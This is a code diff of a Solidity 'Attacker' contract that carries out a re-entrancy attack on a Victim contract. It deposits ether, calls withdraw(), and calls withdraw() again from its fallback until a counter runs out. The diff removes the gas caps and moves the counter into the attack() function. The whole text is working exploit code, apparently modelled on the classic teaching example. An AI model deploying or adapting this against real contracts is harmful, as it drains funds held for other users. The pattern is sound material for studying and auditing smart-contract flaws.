@@ -8,9 +8,8 @@ contract Attacker is Owner {
     address public victimAddress;
 
     // set the victim address on deployment
-    constructor(address _victimAddress, uint256 _attackCounter) Owner() {
+    constructor(address _victimAddress) Owner() {
         victimAddress = address(_victimAddress);
-        attackCounter = _attackCounter;
     }
 
     // get current Attacker balance on Victim contract
@@ -34,23 +33,22 @@ contract Attacker is Owner {
 
     // perform initial deposit on Victim contract
     function depositToVictim(uint256 _value) external payable {
-        (bool success, ) = victimAddress.call{value: _value, gas: 65000}(
+        (bool success, ) = victimAddress.call{value: _value}(
             abi.encodeWithSignature("deposit()")
         );
         require(success, "deposited to victim contract failed");
     }
 
     // perform initial call to Victim contract asking to withdraw funds
-    function attack() external payable {
-        victimAddress.call{gas: 65000}(abi.encodeWithSignature("withdraw()"));
+    function attack(uint256 _attackCounter) external payable {
+        attackCounter = _attackCounter;
+        victimAddress.call(abi.encodeWithSignature("withdraw()"));
     }
 
     // perform re-entrancy attack on Victim's withdraw function
     fallback() external payable {
         if (attackCounter > 0) {
-            victimAddress.call{gas: 65000}(
-                abi.encodeWithSignature("withdraw()")
-            );
+            victimAddress.call(abi.encodeWithSignature("withdraw()"));
             attackCounter--;
         }
     }
